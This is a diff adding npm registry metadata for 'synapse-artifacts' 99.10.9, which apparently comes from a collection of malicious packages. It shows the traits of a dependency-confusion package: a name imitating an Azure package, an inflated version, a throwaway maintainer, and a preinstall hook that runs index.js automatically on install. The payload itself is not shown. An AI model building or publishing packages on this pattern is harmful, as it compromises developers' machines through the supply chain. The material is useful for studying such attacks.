@@ -1,0 +1,62 @@
+{
+    "_id": "synapse-artifacts",
+    "name": "synapse-artifacts",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "synapse-artifacts",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "synapse-artifacts@99.10.9",
+            "_nodeVersion": "14.16.1",
+            "_npmVersion": "6.14.11",
+            "dist": {
+                "integrity": "sha512-bOyNMAbKMNehkHUuid1xe5UrEq3RpdeVhecR/WyUFqSrQlnxrL5prxdmnunNXjf8OdrVe2a3L56cZ2XT/RtNcQ==",
+                "shasum": "c0a19440588fdfdc34969a795e54ee72c5ba6b69",
+                "tarball": "https://registry.npmjs.org/synapse-artifacts/-/synapse-artifacts-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5066,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNQ8dACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmra9Q/+J33WUj+mMdqO1Wh6MNHU/XMDmpI6Iz63BNkxrBQ1C0WlWjIk\r\nH2pcX1MAFa95fRR/MpP31Raa/V1oDiRwmylR1ge6MU9F8K3Vz0S83ibbYx9H\r\noNdMixl5UZHI1N7t1l73YFUe6/jrBEYsD2LuVj7wSQ5uuKLAMv79W87jdLjh\r\nBkRQZQIkfLieucZMMRalZkZXb21XQQQ+Oz5Wg5pq5g3OFO7aAoR7ebYv/igD\r\n2DpacTUsyC0vT+ukMcEkjtp/OWiLNVR1BhMBc6t+satDqPZyg06YYrkC7Vxg\r\nR/nydO4651QfGt+lGAasmAu1hTdH9Y8wvy5Qu1QZ55HxduHnN3xXk1fxygEw\r\n0JyGbieP5PY4FikjKnhwiiyQ2ef3DAlYOUpZIo2REUhglbYFjbtQNZ0dX6K9\r\nMnAnmRIXpldh1wCIO58Tgjh/fI/lZSE2OVpLCH9YM8CTx99TmYyOgbQmtIkg\r\n4NeKJVyujPfOSyivkjFYZtea6ifrlXbvEZZTLGUWdImSJ9KPEWW6p6RD/yTR\r\nFS2tjApB4jWO0DZgAZ+29rP4vqIMNw+HVy4wxEB4npS8lycOqXggDnkVYerG\r\n1NgZLwh2fx6Y0TJQcrF97gJ/l/Ca8njNDWC5e/kkRRrL6lGA1vMy5PpF8l2x\r\nLxgRhuTK5SG0On7KLBMqF75kk3+QX9xOd1M=\r\n=UoLI\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "niv0pplk",
+                "email": "niv0pplk@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "niv0pplk",
+                    "email": "niv0pplk@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/synapse-artifacts_99.10.9_1647644445538_0.5462843356353229"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-18T23:00:45.537Z",
+        "99.10.9": "2022-03-18T23:00:45.662Z",
+        "modified": "2022-03-18T23:00:45.805Z"
+    },
+    "maintainers": [
+        {
+            "name": "niv0pplk",
+            "email": "niv0pplk@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
